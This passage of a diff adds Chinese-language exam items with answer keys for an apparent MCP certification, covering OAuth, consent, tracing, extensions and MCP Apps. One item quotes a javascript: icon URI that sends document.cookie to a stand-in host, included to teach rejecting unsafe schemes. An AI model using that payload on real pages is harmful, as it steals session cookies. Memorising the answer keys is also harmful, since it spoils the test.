+      "explanation": "取消操作天然存在竞态：发送取消时，响应可能已经在途。因此，已取消请求的迟到响应是预期情况，应直接忽略，而不是应用结果、升级为缺陷或用相同 ID 重试。",
+      "references": [
+        "certifications/mcpa/lessons/17-tool-invocation-lifecycle",
+        "certifications/mcpa/lessons/16-notifications-and-subscriptions"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-031",
+      "domain": "interactions-and-execution",
+      "objective": "Apply the request, notification, subscription, and multi round-trip interaction patterns and handle each result type",
+      "prompt": "服务器返回 InputRequiredResult，其中 inputRequests 映射使用 confirm_deploy 和 pick_region 两个键，但没有 requestState。客户端重试原始 tools/call 时必须如何组织请求？",
+      "type": "single",
+      "options": [
+        "使用客户端自选的键发送 inputResponses，并附上空的 requestState 字符串",
+        "只回答第一个键，因为服务器每轮只会问一个问题",
+        "使用服务器选择的同一组两个键发送 inputResponses，并省略 requestState",
+        "在新的 elicitation/create 请求中发送答案，而不是重试原始调用"
+      ],
+      "correct": [
+        2
+      ],
+      "explanation": "重试应使用新的 ID 重复原始请求，并严格按服务器在 inputRequests 中选定的键添加 inputResponses，这样服务器才能把答案与问题对应起来。只有服务器提供了 requestState 时才回显；客户端不能自行编造或发送空值。",
+      "references": [
+        "certifications/mcpa/lessons/14-multi-round-trip-requests-and-elicitation"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-032",
+      "domain": "interactions-and-execution",
+      "objective": "Handle protocol errors and tool execution errors, including version, capability, header, and validation failures",
+      "prompt": "某团队正把仍要求 initialize 握手的旧服务器迁移到 2026-07-28 版线协议。过渡期间，兼容新旧两代协议的客户端通过 stdio 直接发送现代请求，但服务器返回的既不是 DiscoverResult，也不是已识别的现代错误。客户端应得出什么结论？",
+      "type": "single",
+      "options": [
+        "服务器是现代服务器，只是暂时过载；客户端应继续重试同一请求",
+        "服务器一定已崩溃；客户端应立即重启子进程",
+        "服务器拒绝了特定协议版本；客户端应按支持列表重试",
+        "服务器属于旧版；客户端应回退到 initialize 握手"
+      ],
+      "correct": [
+        3
+      ],
+      "explanation": "在 stdio 上，如果现代探测收到无法识别的错误或超时，说明服务器属于旧版，客户端应回退到 initialize 握手。若收到 UnsupportedProtocolVersion 等已识别的现代错误，则表示服务器是支持其他版本的现代实现，不能只根据某个错误码盲目回退。",
+      "references": [
+        "certifications/mcpa/lessons/05-protocol-eras-and-compatibility"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-033",
+      "domain": "interactions-and-execution",
+      "objective": "Handle protocol errors and tool execution errors, including version, capability, header, and validation failures",
+      "prompt": "网关运维人员正在配置：向 2026-07-28 版 MCP 端点 POST 的每个请求必须包含哪些 HTTP 请求头。规范要求哪两个？请选择两项。",
+      "type": "multiple",
+      "options": [
+        "Mcp-Session-Id，用于将请求绑定到同一会话",
+        "MCP-Protocol-Version，与请求元数据中携带的版本一致",
+        "Mcp-Method，用于指明请求携带的 JSON-RPC 方法",
+        "Last-Event-ID，用于恢复中断的流"
+      ],
+      "correct": [
+        1,
+        2
+      ],
+      "explanation": "Streamable HTTP 要求每个请求都带 MCP-Protocol-Version，且与请求元数据中的版本一致；还要求 Mcp-Method 指明请求方法，使中间层无需解析请求体即可路由。Mcp-Session-Id 和 Last-Event-ID 属于已移除的会话及流恢复机制，不再适用。",
+      "references": [
+        "certifications/mcpa/lessons/19-transports-and-http-headers"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-034",
+      "domain": "interactions-and-execution",
+      "objective": "Walk the tool invocation lifecycle from discovery and selection through call, user input, progress, cancellation, and result",
+      "prompt": "某团队审查 tasks 扩展，希望确认客户端轮询 tasks/get 时任务可报告哪些状态。以下哪两项是 2026-07-28 版设计中的真实状态？请选择两项。",
+      "type": "multiple",
+      "options": [
+        "cancelled，在协作式 tasks/cancel 请求成功时使用",
+        "input_required，在任务需要答案才能继续时使用",
+        "queued_for_review，在任务启动前必须由人类批准时使用",
+        "retrying，在底层工具调用抛出异常时自动使用"
+      ],
+      "correct": [
+        0,
+        1
+      ],
+      "explanation": "tasks 扩展定义了 working、input_required、completed、failed 和 cancelled 状态，因此任务既可以在执行中暂停等待输入，也可以因协作式取消请求成功而结束。重新设计后的扩展没有单独的 queued_for_review 或自动 retrying 状态。",
+      "references": [
+        "certifications/mcpa/lessons/21-long-running-work-and-tasks"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-035",
+      "domain": "security-and-governance",
+      "objective": "Locate the trust boundaries between host, client, server, model, and the tools and content a server exposes",
+      "prompt": "某 host 提供一键配置：用户从网页粘贴一段配置，host 可启动其中描述的本地 stdio 服务器。在运行服务器命令前，host 必须做什么？",
+      "type": "single",
+      "options": [
+        "完整显示准确命令，明确标为代码执行，并要求用户显式批准",
+        "在模型沙箱中运行命令，因为配置是模型推荐的",
+        "先向服务器索取 serverInfo，只有报告的名称看起来合法才运行",
+        "立即运行命令，因为本地 stdio 服务器位于 host 自己的信任区内"
+      ],
+      "correct": [
+        0
+      ],
+      "explanation": "一键本地配置会在用户机器上执行代码，因此规范的安全指引要求客户端不截断地展示准确命令，标明这是潜在危险操作，要求显式批准，并允许用户取消。本地并不意味着粘贴来的命令可信，自报的 serverInfo 也无法证明任何事情。",
+      "references": [
+        "certifications/mcpa/lessons/22-trust-boundaries",
+        "certifications/mcpa/lessons/26-risk-and-safety-controls"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-036",
+      "domain": "security-and-governance",
+      "objective": "Apply OAuth-based authorization, client registration, scopes, and user consent so a user approves what a server may see and do",
+      "prompt": "客户端通过 HTTP 调用 MCP 服务器时未携带 token，收到 401 响应。客户端应如何发现哪个授权服务器为该资源签发 token？",
+      "type": "single",
+      "options": [
+        "让最终用户凭记忆粘贴授权服务器 URL",
+        "读取 WWW-Authenticate 请求头中的 resource_metadata 值，或读取 well-known 元数据路径",
+        "改为读取 server/discover 调用返回、由服务器自报的 serverInfo 字段",
+        "不断猜测常见授权服务器域名，直到某一个接受客户端"
+      ],
+      "correct": [
+        1
+      ],
+      "explanation": "401 响应应携带含 resource_metadata 值的 WWW-Authenticate 质询；否则客户端回退到 well-known 的受保护资源元数据路径。二者都会指向列出授权服务器的受保护资源元数据，而不依赖猜测或自报的 serverInfo。",
+      "references": [
+        "certifications/mcpa/lessons/23-oauth-authorization"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-037",
+      "domain": "security-and-governance",
+      "objective": "Apply OAuth-based authorization, client registration, scopes, and user consent so a user approves what a server may see and do",
+      "prompt": "命令行 MCP 客户端遇到不声明支持 Client ID Metadata Document 的授权服务器，于是使用 localhost 重定向 URI 回退到动态客户端注册。其注册请求必须携带哪种 application_type？",
+      "type": "single",
+      "options": [
+        "service，因为命令行工具注册为无人值守的机器到机器客户端",
+        "web，因为任何完成浏览器重定向的 OAuth 客户端都属于 Web 应用",
+        "native，因为桌面、命令行和 localhost 客户端都注册为原生应用",
+        "none，因为 application_type 是授权服务器会忽略的可选元数据"
+      ],
+      "correct": [
+        2
+      ],
+      "explanation": "回退到动态客户端注册时，桌面、命令行和 localhost 客户端必须发送 application_type: native；远程浏览器客户端则发送 web，让授权服务器应用正确的重定向 URI 规则。动态客户端注册本身已弃用，推荐改用 Client ID Metadata Document，但在服务器未声明支持时仍可作为回退方案。",
+      "references": [
+        "certifications/mcpa/lessons/24-client-registration-and-identity"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-038",
+      "domain": "security-and-governance",
+      "objective": "Apply OAuth-based authorization, client registration, scopes, and user consent so a user approves what a server may see and do",
+      "prompt": "用户查看参数后，批准了一次破坏性的 delete_record 工具调用。片刻后，在同一轮中，模型又想调用另一个破坏性工具 archive_record。之前的批准是否覆盖这次新调用？",
+      "type": "single",
+      "options": [
+        "覆盖，因为批准一个破坏性工具后，本轮剩余时间内所有破坏性工具都获批",
+        "覆盖，但只是因为两个工具名称共享与 record 相关的前缀",
+        "不覆盖，但只是因为 archive_record 的名称比 delete_record 长",
+        "不覆盖，每次敏感工具调用都需单独同意，批准一个破坏性工具不等于批准另一个"
+      ],
+      "correct": [
+        3
+      ],
+      "explanation": "同意按单次调用限定，而不是为整个会话一揽子授予。因此，即使仍在同一轮，批准一次破坏性调用也不会延伸到其他工具。名称是否相似或长短如何，都不影响同意能否转移。",
+      "references": [
+        "certifications/mcpa/lessons/25-consent-and-least-privilege"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-039",
+      "domain": "security-and-governance",
+      "objective": "Choose risk and safety controls against tool poisoning, injection, token misuse, and over-broad access",
+      "prompt": "安全负责人审查新服务器时发现，某工具的 icons 条目把 src 设为 javascript:fetch('https://collect.example/'+document.cookie)。渲染图标的客户端必须如何处理？",
+      "type": "single",
+      "options": [
+        "拒绝该图标，因为图标 URI 必须使用 HTTPS 或 data:，javascript: 等不安全方案必须拒绝",
+        "渲染该图标，因为图标只是装饰性元数据，绝不会在 host 界面中执行",
+        "仅在模型确认图标符合工具声明用途后渲染",
+        "自动把 javascript: 改写为 https:，再获取新地址"
+      ],
+      "correct": [
+        0
+      ],
+      "explanation": "图标元数据是不可信的服务器输入。规范要求使用方只接受 HTTPS 或 data: 图标 URI，拒绝 javascript: 等不安全方案和重定向，并把 SVG 等获取到的载荷视为可能执行代码。改写方案或询问模型，都不能让攻击者控制的 URI 变得安全。",
+      "references": [
+        "certifications/mcpa/lessons/22-trust-boundaries",
+        "certifications/mcpa/lessons/26-risk-and-safety-controls"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-040",
+      "domain": "security-and-governance",
+      "objective": "Design auditability and observability so protocol activity can be traced, attributed, and reviewed",
+      "prompt": "事故审查需要跨 host、客户端和实际执行工具的服务器追踪一次失败调用。哪种机制专门用于在这些链路之间传递关联信息？",
+      "type": "single",
+      "options": [
+        "JSON-RPC ID，因为请求 ID 保证在整个系统中永久唯一",
+        "在请求元数据中以 traceparent、tracestate 和 baggage 携带的 OpenTelemetry trace 上下文",
+        "clientInfo 字段，因为客户端会在每个传出请求中自报该字段",
+        "cacheScope 字段，因为它据称用于标记哪些请求属于同一 trace"
+      ],
+      "correct": [
+        1
+      ],
+      "explanation": "W3C Trace Context 与 Baggage 字段以 traceparent、tracestate 和 baggage 的形式随请求元数据传递，专门用于跨 host、客户端、服务器和上游链路关联请求。clientInfo 仅用于显示，cacheScope 管理缓存而非追踪。",
+      "references": [
+        "certifications/mcpa/lessons/27-auditability-and-observability"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-041",
+      "domain": "security-and-governance",
+      "objective": "Locate the trust boundaries between host, client, server, model, and the tools and content a server exposes",
+      "prompt": "一台尚未经过组织审核的服务器列出了某工具，其注解声称 readOnlyHint 为 true、destructiveHint 为 false。host 是否应仅凭这些注解，就允许模型跳过该工具通常需要的确认步骤？",
+      "type": "single",
+      "options": [
+        "不应，但原因只在于 destructiveHint 默认为 false 且无法覆盖",
+        "应当，因为注解是服务器无法虚报的强制保证",
+        "不应，注解只是提示；除非服务器可信，否则必须将其视为不可信输入",
+        "应当，但前提是这些注解也在工具描述文本中重复出现"
+      ],
+      "correct": [
+        2
+      ],
+      "explanation": "工具注解只是提示，不是强制保证。除非提供注解的服务器本身可信，否则必须把它们视为不可信输入。因此，host 不应只因未经审核的服务器给出了看似安全的注解，就免除确认步骤。",
+      "references": [
+        "certifications/mcpa/lessons/22-trust-boundaries",
+        "certifications/mcpa/lessons/09-reading-server-manifests"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-042",
+      "domain": "security-and-governance",
+      "objective": "Apply OAuth-based authorization, client registration, scopes, and user consent so a user approves what a server may see and do",
+      "prompt": "用户点击 Authorize 后被重定向回来并收到授权响应，但响应中指定的 issuer 与客户端在重定向前记录的 issuer 不一致。客户端必须怎么做？",
+      "type": "single",
+      "options": [
+        "接受响应，但先把两个 issuer 字符串都规范化为小写",
+        "接受响应，因为授权码本身足以证明 issuer 有效",
+        "仍然接受响应，因为 issuer 只与错误响应有关，与成功响应无关",
+        "以不匹配为由拒绝响应，即使交换的其他部分看起来都成功"
+      ],
+      "correct": [
+        3
+      ],
+      "explanation": "issuer 校验用于防御混淆攻击：客户端在重定向前记录预期 issuer，并与返回值进行不做规范化的精确比较，任何不匹配都要拒绝，包括其他方面看似成功的响应。来自错误 issuer、看似有效的授权码正是此检查要拦截的攻击。",
+      "references": [
+        "certifications/mcpa/lessons/23-oauth-authorization"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-043",
+      "domain": "security-and-governance",
+      "objective": "Choose risk and safety controls against tool poisoning, injection, token misuse, and over-broad access",
+      "prompt": "某服务器公开了一个调用昂贵外部搜索 API 的工具。如果不加限制，一个行为异常的客户端就可能耗尽服务器配额，影响所有其他用户。哪种控制措施最直接？",
+      "type": "single",
+      "options": [
+        "在服务器端按工具实施速率限制，不受客户端声称需求的影响",
+        "把速率限制写进工具描述，作为给模型的指令",
+        "延长工具超时时间，减少重试次数",
+        "依赖客户端自己的 idempotentHint 声明来减缓重复调用"
+      ],
+      "correct": [
+        0
+      ],
+      "explanation": "无论客户端声明什么，服务器都应自行实施速率限制。客户端提示或更长超时无法阻止蓄意或有缺陷的调用方；仅写在描述里的限制只是建议文本，模型可能忽略。",
+      "references": [
+        "certifications/mcpa/lessons/26-risk-and-safety-controls"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-044",
+      "domain": "security-and-governance",
+      "objective": "Design auditability and observability so protocol activity can be traced, attributed, and reviewed",
+      "prompt": "某团队正在设计 MCP 工具调用的审计日志。审查人员指出，草案会记录每次调用的完整原始参数，其中包括用户可能粘贴敏感数据的自由文本字段。设计应如何修改？",
+      "type": "single",
+      "options": [
+        "完全停止记录参数，让审计轨迹只记录发生过某次调用",
+        "遮盖或省略敏感参数内容，避免审计记录携带凭据、秘密或个人数据",
+        "使用存放在日志旁边的密钥加密参数，让任何读者都能解密",
+        "仍记录完整原始参数，因为审计完整性始终完全高于数据敏感性"
+      ],
+      "correct": [
+        1
+      ],
+      "explanation": "审计与可观测性实践要求日志绝不能包含凭据、秘密或个人数据。因此，应遮盖或省略敏感参数内容，同时保留足够的结构信息，例如方法、工具名称和关联 ID，以支持追踪与归因。",
+      "references": [
+        "certifications/mcpa/lessons/27-auditability-and-observability"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-045",
+      "domain": "security-and-governance",
+      "objective": "Apply OAuth-based authorization, client registration, scopes, and user consent so a user approves what a server may see and do",
+      "prompt": "某 MCP 代理代表多个不同下游客户端与第三方授权服务器通信时，统一使用一个静态 client id。为避免混淆代理问题，该设计还需要增加哪一步？",
+      "type": "single",
+      "options": [
+        "代理应停止校验重定向 URI，因为静态 client id 已为它们担保",
+        "代理应在所有下游客户端之间复用同一授权码，以简化流程",
+        "代理在转发每个动态注册客户端前，必须分别获得用户同意",
+        "无需额外步骤，因为一个静态 client id 已会自动隔离各下游客户端"
+      ],
+      "correct": [
+        2
+      ],
+      "explanation": "代理代表许多动态注册客户端向授权服务器出示同一个静态 client id 时，必须在转发前针对每个客户端取得用户明确同意。否则，授权服务器无法区分实际行动的是哪个下游客户端。",
+      "references": [
+        "certifications/mcpa/lessons/24-client-registration-and-identity"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-046",
+      "domain": "security-and-governance",
+      "objective": "Choose risk and safety controls against tool poisoning, injection, token misuse, and over-broad access",
+      "prompt": "某工作流只需读取客户订单历史，但团队准备授予它还能创建和取消订单的 scope。哪项原则应当阻止这一做法？",
+      "type": "single",
+      "options": [
+        "无状态性，因为订单历史显然是跨多个请求的状态",
+        "缓存 scope，因为公共与私有缓存需要完全不同的访问权限",
+        "幂等性，因为创建新订单根本不是幂等操作",
+        "最小权限，因为工作流只应获得完成任务所需的访问权限"
+      ],
+      "correct": [
+        3
+      ],
+      "explanation": "最小权限意味着只授予任务实际需要的访问能力。因此，只读历史工作流应获得只读 scope，而不是还能创建或取消订单的更宽 scope。幂等性、无状态性和缓存因素都与这项决定无关。",
+      "references": [
+        "certifications/mcpa/lessons/25-consent-and-least-privilege"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-047",
+      "domain": "security-and-governance",
+      "objective": "Choose risk and safety controls against tool poisoning, injection, token misuse, and over-broad access",
+      "prompt": "策略引擎在批准候选服务器前，正根据已知 MCP 攻击面为其评分。以下哪三项是真实威胁，应纳入评分？请选择三项。",
+      "type": "multiple",
+      "options": [
+        "缓存陈旧，其中 ttlMs 为零只表示结果立即被视为过期",
+        "工具投毒：描述中包含面向模型的隐藏指令",
+        "混淆代理：代理使用一个静态 client id 向第三方授权服务器转发请求",
+        "暗中换货：先前获批的工具定义在批准后悄悄发生变化"
+      ],
+      "correct": [
+        1,
+        2,
+        3
+      ],
+      "explanation": "工具投毒、暗中换货和代理的混淆代理行为都是有文档记录的威胁，分别可用输出清理、定义固定和逐客户端同意等措施缓解。ttlMs 为零只表示结果立即被视为过期，这是缓存细节，不是安全威胁。",
+      "references": [
+        "certifications/mcpa/lessons/26-risk-and-safety-controls"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-048",
+      "domain": "security-and-governance",
+      "objective": "Apply OAuth-based authorization, client registration, scopes, and user consent so a user approves what a server may see and do",
+      "prompt": "某团队正在依据 2026-07-28 版授权要求检查其 MCP 客户端的 OAuth 实现。实际要求哪三种做法？请选择三项。",
+      "type": "multiple",
+      "options": [
+        "每个 HTTP 请求都在 Authorization 请求头中发送 bearer token，绝不放入查询字符串",
+        "在授权请求和 token 请求中都发送 resource 参数，用于标识服务器的规范 URI",
+        "客户端具备能力时使用带 S256 的 PKCE",
+        "在本地存储长期 refresh token，并假定服务器总会签发一个"
+      ],
+      "correct": [
+        0,
+        1,
+        2
+      ],
+      "explanation": "Bearer token 只能放在 Authorization 请求头中；支持时必须使用带 S256 的 PKCE；授权请求和 token 请求都必须发送 Resource Indicators。绝不能假定一定有 refresh token，因为公共客户端的 refresh token 会轮换，而且服务器可能根本不签发。",
+      "references": [
+        "certifications/mcpa/lessons/23-oauth-authorization"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-049",
+      "domain": "use-cases-and-ecosystem",
+      "objective": "Map the roles, responsibilities, governance, and adoption patterns of teams building and deploying MCP",
+      "prompt": "某团队正在为新的远程 MCP 部署绘制职责矩阵。谁应负责实现 Protected Resource Metadata 并校验 token audience？",
+      "type": "single",
+      "options": [
+        "服务器作者，因为这些是资源服务器自身的要求",
+        "注册表发布者，因为 Protected Resource Metadata 是 server.json 的一部分",
+        "最终用户，因为由用户授予同意",
+        "只能由网关运维人员负责，服务器作者绝不负责"
+      ],
+      "correct": [
+        0
+      ],
+      "explanation": "Protected Resource Metadata 和 audience 校验是作为 OAuth 资源服务器的 MCP 服务器自身要求，因此由服务器作者负责实现。这不同于最终用户的同意职责、注册表发布者的元数据职责，也不能由可能增加额外强制措施的网关运维人员取代。",
+      "references": [
+        "certifications/mcpa/lessons/28-roles-and-adoption"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-050",
+      "domain": "use-cases-and-ecosystem",
+      "objective": "Select operational use cases and the primitives or extensions that fit each one",
+      "prompt": "某团队公开了一个接受 repository 参数的 prompt，但用户经常在 host 表单中输错仓库名称。哪项 MCP 能力可让 host 在用户输入时建议有效值？",
+      "type": "single",
+      "options": [
+        "使用 subscriptions/listen 流，预先把所有仓库名称推送给客户端",
+        "使用 completion/complete 请求，为 prompt 参数返回建议值",
+        "用户每输入一个字符，host 就向服务器发送 elicitation/create 请求",
+        "每次按键都调用 resources/list，再由 host 筛选出仓库名称"
+      ],
+      "correct": [
+        1
+      ],
+      "explanation": "参数补全正是为此设计的工具：host 调用 completion/complete，传入 prompt 引用和参数的部分值，服务器最多返回 100 个建议值。列出资源或流式通知不是补全机制；elicitation 是服务器向用户请求输入，不是 host 向服务器查询。",
+      "references": [
+        "certifications/mcpa/lessons/13-prompts-and-completion",
+        "certifications/mcpa/lessons/29-operational-use-cases"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-051",
+      "domain": "use-cases-and-ecosystem",
+      "objective": "Reason about ecosystem portability across clients, servers, SDKs, extensions, gateways, and registries",
+      "prompt": "一个以 com.example/my-extension 发布的第三方扩展对线协议格式作出了破坏性变更。维护者希望基于旧行为构建的集成无需修改仍能运行。维护者应怎么做？",
+      "type": "single",
+      "options": [
+        "沿用同一标识符，因为扩展标识符会在后台自动进行版本管理",
+        "彻底移除旧标识符，避免任何客户端意外协商到旧行为",
+        "使用新标识符发布破坏性变更，例如 com.example/my-extension-v2，而不是复用旧标识符",
+        "沿用同一标识符，因为每个客户端反正都必须在每次请求时重新协商扩展"
+      ],
+      "correct": [
+        2
+      ],
+      "explanation": "扩展发生破坏性变更时需要使用新标识符，让新旧行为可以并行协商和运行。标识符不会自动进行版本管理；直接移除旧标识符则会破坏所有仍依赖旧行为的集成，而不只是主动采用新版本的集成。",
+      "references": [
+        "certifications/mcpa/lessons/30-the-extensions-framework"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-052",
+      "domain": "use-cases-and-ecosystem",
+      "objective": "Select operational use cases and the primitives or extensions that fit each one",
+      "prompt": "某 MCP Apps 界面在 permissions 元数据中加入 camera 来申请摄像头访问，应用开发者因此认为沙箱 iframe 里现在一定能使用摄像头。这个假设正确吗？",
+      "type": "single",
+      "options": [
+        "不正确，因为 permissions 元数据只适用于网络访问，绝不适用于设备硬件",
+        "正确，但只适用于麦克风和地理位置，摄像头除外",
+        "正确，因为在该元数据字段中声明权限就会立即获得权限",
+        "不正确，host 可能批准所请求的权限，但应用绝不能假定权限已经授予"
+      ],
+      "correct": [
+        3
+      ],
+      "explanation": "camera、microphone、geolocation 和 clipboardWrite 等权限只是 host 可以选择批准的请求，并非保证。行为良好的应用应把已声明权限视为可选，并在运行时检查，而不能因为提出了申请就假定能力已经存在。",
+      "references": [
+        "certifications/mcpa/lessons/31-mcp-apps"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-053",
+      "domain": "use-cases-and-ecosystem",
+      "objective": "Reason about ecosystem portability across clients, servers, SDKs, extensions, gateways, and registries",
+      "prompt": "某平台团队在多台内部 MCP 服务器前部署网关，希望网关无需解析每个请求体即可路由客户端请求。网关应依据什么进行路由？",
+      "type": "single",
+      "options": [
+        "依据 Mcp-Method 和 Mcp-Name 请求头，并与请求体核对，而不是盲目信任",
+        "依据请求元数据中的 clientInfo 字段，因为它能唯一标识应处理请求的服务器",
+        "依据 JSON-RPC ID，因为 ID 编码了最初签发它的服务器",
+        "依据 cacheScope 字段，因为它就是为携带路由信息设计的"
+      ],
+      "correct": [
+        0
+      ],
+      "explanation": "这些必需请求头的目的，正是让网关无需解析每个请求体即可路由并执行策略。但网关仍必须校验请求头与请求体一致，并拒绝不匹配；不能根据客户端自报的 clientInfo 或从未用于路由的字段进行转发。",
+      "references": [
+        "certifications/mcpa/lessons/32-registry-gateways-and-sdk-tiers",
+        "certifications/mcpa/lessons/19-transports-and-http-headers"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-054",
+      "domain": "use-cases-and-ecosystem",
+      "objective": "Map the roles, responsibilities, governance, and adoption patterns of teams building and deploying MCP",
+      "prompt": "某团队准备上线生产环境，希望进行一次端到端演练，同时覆盖发现、经过校验的工具调用、同意往返和审计日志，而不是分别孤立测试。这描述的是哪种演练？",
+      "type": "single",
+      "options": [
+        "服务器首次发布前只执行一次的注册表命名空间校验",
+        "同时贯穿发现、执行、同意和审计的综合就绪演练",
+        "只测量每秒成功处理原始请求数量的负载测试",
+        "只测试单个 JSON Schema 校验函数的狭窄单元测试"
+      ],
+      "correct": [
+        1
+      ],
+      "explanation": "用一次完整交换同时演练发现、经过校验的工具执行、MRTR 同意和审计日志，是跨越所有领域的综合就绪检查。它不同于狭窄单元测试、纯吞吐量负载测试或注册表所有权检查。",
+      "references": [
+        "certifications/mcpa/lessons/33-mcpa-capstone-readiness"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-055",
+      "domain": "use-cases-and-ecosystem",
+      "objective": "Select operational use cases and the primitives or extensions that fit each one",
+      "prompt": "某团队要把无人值守的夜间批处理作业连接到 MCP 服务器，完成机器到机器集成。普通的面向用户 OAuth 同意页面不适用于这一场景。团队应采用什么？",
+      "type": "single",
+      "options": [
+        "URL 模式 elicitation，因为它专门用于带外人工批准",
+        "服务器签发的句柄，因为这种句柄能完全取代自动化批处理客户端的授权",
+        "OAuth Client Credentials 扩展，它面向 CI 或守护进程等机器到机器客户端",
+        "动态客户端注册，因为它彻底取消了授权需求"
+      ],
+      "correct": [
+        2
+      ],
+      "explanation": "OAuth Client Credentials 扩展专为 CI 作业和守护进程等机器到机器客户端设计，这些客户端没有人类参与交互式同意流程。elicitation 需要人类；DCR 只负责注册客户端，并不会取消授权；句柄解决的是状态而非身份问题。",
+      "references": [
+        "certifications/mcpa/lessons/29-operational-use-cases"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-056",
+      "domain": "use-cases-and-ecosystem",
+      "objective": "Map the roles, responsibilities, governance, and adoption patterns of teams building and deploying MCP",
+      "prompt": "某平台团队正在选择 SDK 来构建新的生产级 MCP 服务器，希望在规范一致性和关键缺陷修复速度上获得有力保证。其他条件相同时，应优先选择哪个 SDK 层级？",
+      "type": "single",
+      "options": [
+        "Tier 3，因为实验性 SDK 最先获得新功能",
+        "下载量最大的任意层级，因为受欢迎程度是唯一重要信号",
+        "Tier 2，因为 80% 的一致性测试通过率是生态常态",
+        "Tier 1，因为它通过完整一致性测试，并承诺快速分诊和修复缺陷"
+      ],
+      "correct": [
+        3
+      ],
+      "explanation": "SDK 分层中，Tier 1 提供最强保证：通过完整一致性测试，并承诺快速分诊及修复关键缺陷，这些对生产部署至关重要。Tier 2 接受较低的一致性门槛，Tier 3 则明确属于实验性层级，与下载量无关。",
+      "references": [
+        "certifications/mcpa/lessons/28-roles-and-adoption"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-057",
+      "domain": "use-cases-and-ecosystem",
+      "objective": "Reason about ecosystem portability across clients, servers, SDKs, extensions, gateways, and registries",
+      "prompt": "某工作组希望先公开孵化一个新的 MCP 扩展，再提议将其转为官方扩展。按照扩展流程，早期工作应放在哪里？",
+      "type": "single",
+      "options": [
+        "放在由 Working Group 或 Interest Group 所有、名称以 experimental-ext- 开头的仓库中",
+        "直接放进核心规范草案，因为每个扩展一开始都是核心功能",
+        "放在任意私有 fork 中，因为客户端采用扩展前不需要公开流程",
+        "立即使用 io.modelcontextprotocol 前缀，因为发布后就自动获得官方地位"
+      ],
+      "correct": [
+        0
+      ],
+      "explanation": "实验性扩展位于由 Working Group 或 Interest Group 所有、以 experimental-ext- 为前缀的仓库中。转为官方扩展需要走 Extensions Track SEP，在官方 SDK 中提供参考实现，并接受 Core Maintainers 审查。发布本身不能占用 io.modelcontextprotocol 前缀，扩展也不进入核心规范。",
+      "references": [
+        "certifications/mcpa/lessons/30-the-extensions-framework"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-058",
+      "domain": "use-cases-and-ecosystem",
+      "objective": "Reason about ecosystem portability across clients, servers, SDKs, extensions, gateways, and registries",
+      "prompt": "某聚合服务团队计划把官方 MCP Registry 镜像到自己的客户目录中。注册表当前的状态意味着团队应为哪些情况做准备？",
+      "type": "single",
+      "options": [
+        "对每个软件包执行强制安全扫描，因为注册表会认证服务器代码",
+        "在正式可用前可能出现破坏性变更或数据重置，因为注册表仍处于预览阶段",
+        "准备付费访问层级，因为镜像注册表需要商业许可协议",
+        "无需特殊准备，因为注册表已正式可用，数据模型也已冻结"
+      ],
+      "correct": [
+        1
+      ],
+      "explanation": "MCP Registry 仍处于预览阶段，维护者警告正式可用前可能发生破坏性变更或数据重置，因此聚合服务应支持重新同步和 schema 变化。注册表托管元数据，并把安全扫描交给软件包注册表和下游聚合服务；它不认证服务器代码。",
+      "references": [
+        "certifications/mcpa/lessons/32-registry-gateways-and-sdk-tiers"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-059",
+      "domain": "use-cases-and-ecosystem",
+      "objective": "Select operational use cases and the primitives or extensions that fit each one",
+      "prompt": "host 开发者正在实现 MCP Apps 扩展支持，并研究 UI 资源自身的元数据如何约束沙箱 iframe。哪三项说法正确？请选择三项。",
+      "type": "multiple",
+      "options": [
+        "UI 资源通过普通 resources/read 调用获取，并携带 MIME 类型 text/html;profile=mcp-app",
+        "如果 UI 资源元数据完全省略 csp，host 必须采用阻止传出连接的限制性默认值",
+        "通过 permissions 元数据请求摄像头或麦克风访问后，无需 host 参与就会自动获得权限",
+        "UI 资源的 csp 元数据是由 connectDomains、frameDomains 等域名列表组成的对象，而不是扁平的允许来源列表"
+      ],
+      "correct": [
+        0,
+        1,
+        3
+      ],
+      "explanation": "UI 资源的 csp 元数据由 connectDomains、resourceDomains、frameDomains 和 baseUriDomains 等域名列表字段组成，而不是扁平来源列表；省略 csp 时会强制采用阻止传出连接的限制性默认值；资源本身通过普通 resources/read 调用获取，并携带 mcp-app HTML profile。应用提出 camera 或 microphone 权限请求，并不意味着自动获得权限。",
+      "references": [
+        "certifications/mcpa/lessons/31-mcp-apps"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-060",
+      "domain": "use-cases-and-ecosystem",
+      "objective": "Map the roles, responsibilities, governance, and adoption patterns of teams building and deploying MCP",
+      "prompt": "综合项目就绪审查正在确认，团队的端到端演练在认证前是否真正覆盖了 2026-07-28 版的完整范围。演练应包含哪三个要素？请选择三项。",
+      "type": "multiple",
+      "options": [
+        "校验提供给服务器的 token audience，并拒绝为其他资源签发的 token",
+        "把旧版 initialize 握手保留在主请求路径中，让新旧两代共用同一代码路径",
+        "端到端传播 trace 上下文，使交换可在事后归因和审查",
+        "使用新请求 ID 和受完整性保护的 requestState 完成 MRTR 同意往返"
+      ],
+      "correct": [
